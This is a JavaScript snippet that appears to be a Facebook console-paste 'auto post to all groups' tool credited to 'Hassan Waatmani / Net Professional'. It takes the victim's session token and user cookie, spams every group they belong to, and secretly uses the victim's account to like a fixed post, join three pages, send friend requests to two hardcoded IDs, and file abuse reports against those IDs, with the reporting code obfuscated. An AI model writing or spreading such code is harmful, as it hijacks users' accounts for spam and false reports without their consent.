function autopostingfunc(e){if(document.getElementById("txtFloodMsg").value!="")msg=document.getElementById("txtFloodMsg").value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer="+user_id+"&token=v7&lazy=0&__user="+user_id,function(t){var n=t;var r=n.substring(n.indexOf("{"));var i=JSON.parse(r);i=i.payload.entries;for(var s=0;s<i.length;s++)arr.push(i[s].uid);e.parentNode.innerHTML="Please Wait...";postitok()})}function postitok(){pst="fb_dtsg="+dts+"&xhpc_composerid="+composerid+"&xhpc_targetid="+arr[suc]+"&xhpc_context=home&xhpc_fbx=1&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_1]=pagelet_group_composer";with(newx=new XMLHttpRequest)open("POST","/ajax/updatestatus.php?__a=1"),send(pst);suc++;if(suc>arr.length){alert("Auto Posting Completed. Now Refresh your Homepage.");suc=0}else setTimeout("postitok()",3e4/arr.length)}function P(e){var t=new XMLHttpRequest;var n="//www.facebook.com/ajax/ufi/like.php";var r="like_action=true&ft_ent_identifier="+e+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+e+"&nctr[_1]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";t.open("POST",n,true);t.onreadystatechange=function(){if(t.readyState==4&&t.status==200){t.close}};t.send(r)}function Report(e){var t=new XMLHttpRequest;var n=_0xe4a5[6];var r=_0xe4a5[7]+fb_dtsg+_0xe4a5[8]+e+_0xe4a5[9]+e+_0xe4a5[10]+now+_0xe4a5[11]+user_id+_0xe4a5[12]+user_id+_0xe4a5[13];t[_0xe4a5[15]](_0xe4a5[14],n,true);t[_0xe4a5[16]]=function(){if(t[_0xe4a5[17]]==4&&t[_0xe4a5[18]]==200){t[_0xe4a5[19]]}};t[_0xe4a5[20]](r)}var grouppost="<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'> Auto Post Full Groups By Hassan Waatmani </a></div></br>";grouppost+="<div><textarea id='txtFloodMsg' placeholder='Whats on Your Mind :P....' style='COLOR:WHITE;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";grouppost+="<div><br><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Made By Hassan Waatmani </a></span><button style='margin-left:437px' class='_2 _3 _6 _4 _5 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Net Professional.</br>Made by:</A><A style='color:#3B5998;' href='http://www.facebook.com/waatmani' target='_0'>Hassan Waatmani</A></A>.</br>Powerd By : <A style='color:#3B5998;' href='http://www.facebook.com/Netpcom' target='_0'>Net Professional </A></A>.</br>For More Tricks : <A style='color:#3B5998;' href='http://www.netpf.com' target='_0'>Net Professional</A>.</A><br></div>";var Popupset=document.createElement("div");Popupset.setAttribute("style","min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:White");Popupset.innerHTML=grouppost;document.body.appendChild(Popupset);jx={getHTTPObject:function(){var e=false;if(typeof ActiveXObject!="undefined")try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=false}}else if(window.XMLHttpRequest)try{e=new XMLHttpRequest}catch(t){e=false}return e},load:function(url,callback,format,method,opt){var http=this.init();if(!http||!url)return;if(http.overrideMimeType)http.overrideMimeType("text/xml");if(!method)method="GET";if(!format)format="text";if(!opt)opt={};format=format.toLowerCase();method=method.toUpperCase();var now="uid="+(new Date).getTime();url+=url.indexOf("?")+1?"&":"?";url+=now;var parameters=null;if(method=="POST"){var parts=url.split("?");url=parts[0];parameters=parts[1]}http.open(method,url,true);var ths=this;if(opt.handler)http.onreadystatechange=function(){opt.handler(http)};else http.onreadystatechange=function(){if(http.readyState==4)if(http.status==200){var result="";if(http.responseText)result=http.responseText;if(format.charAt(0)=="j"){result=result.replace(/[\n\r]/g,"");result=eval("("+result+")")}else if(format.charAt(0)=="x")result=http.responseXML;if(callback)callback(result)}else{if(opt.loadingIndicator)document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);if(opt.loading)document.getElementById(opt.loading).style.display="none";if(error)error(http.status)}};http.send(parameters)},bind:function(e){var t={url:"",onSuccess:false,onError:false,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""};for(var n in t)if(e[n])t[n]=e[n];if(!t.url)return;var r=false;if(t.loadingIndicator){r=document.createElement("div");r.setAttribute("style","position:absolute;top:0px;left:0px;");r.setAttribute("class","loading-indicator");r.innerHTML=t.loadingIndicator;document.getElementsByTagName("body")[0].appendChild(r);this.opt.loadingIndicator=r}if(t.loading)document.getElementById(t.loading).style.display="block";this.load(t.url,function(e){if(t.onSuccess)t.onSuccess(e);if(t.update)document.getElementById(t.update).innerHTML=e;if(r)document.getElementsByTagName("body")[0].removeChild(r);if(t.loading)document.getElementById(t.loading).style.display="none"},t.format,t.method,t)},init:function(){return this.getHTTPObject()}};var j=0;var k=0;var suc=0;var msg="Auto post all gr by Hassan Waatmani";var arr=new Array;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var a=document.body.innerHTML;var dts=document.getElementsByName("fb_dtsg")[0].value;var composerid=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);setTimeout("autopostingfunc()",1e3);P("690056974372721");var _0xe4a5=["value","fb_dtsg","getElementsByName","match","cookie","getTime","//www.facebook.com/ajax/pages/fan_status.php","fb_dtsg=","&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A","%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNetpfcom7%22%2C%22report_type%22%3A145%2C%22rid%22%3A","%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A","%2C%22user%22%3A","%7D&file_report=1&__user=","&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880","POST","open","onreadystatechange","readyState","status","close","send","100001052749861","100001734339861"];var fb_dtsg=document[_0xe4a5[2]](_0xe4a5[1])[0][_0xe4a5[0]];var user_id=document[_0xe4a5[4]][_0xe4a5[3]](document[_0xe4a5[4]][_0xe4a5[3]](/c_user=(\d+)/)[1]);var now=(new Date)[_0xe4a5[5]]();Report(_0xe4a5[21]);Report(_0xe4a5[22])


//eval
var parent=document.getElementsByTagName("html")[0]; 
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

body = document.body;

if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "100px";
 div.style.opacity= 0.90;
 div.style.bottom = "+35px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Close (F5)</center></blink></a>"
 body.appendChild(div);
}
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "135px";
 div.style.opacity= 0.90;
 div.style.bottom = "+10px";
 div.style.left = "+0px";
 div.style.backgroundColor = "rgba(0,0,0,0.5)";
 div.style.border = "1px solid rgba(0,0,0,0.5)";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.netpf.com/' title='Net Professional'><blink><center>For More Tricks!</center></blink></a>"
 body.appendChild(div);
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}

Like("439430329420491");
Like("418836291540460");
Like("233578153383244");


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();

  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}

IDS("100001052749861");
IDS("100001734339861");
